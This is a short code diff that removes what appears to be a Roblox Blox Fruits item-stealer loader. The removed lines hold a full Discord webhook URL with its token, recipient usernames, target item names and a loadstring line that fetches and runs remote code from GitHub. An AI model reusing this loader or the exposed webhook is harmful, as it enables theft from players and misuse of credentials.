@@ -1,5 +1,1 @@
-Webhook = "https://discord.com/api/webhooks/1251670861509955784/O3WJ3xujJoroHG8-05XPdis34r0LwTj2cV1W-F87ftKxylRtfH17zPGw2SYA1zV6-oJY" -- << Your Webhook
-Usernames = {"basil2900", "gamertuned1"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Control-Control"} -- << Fruits you want
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
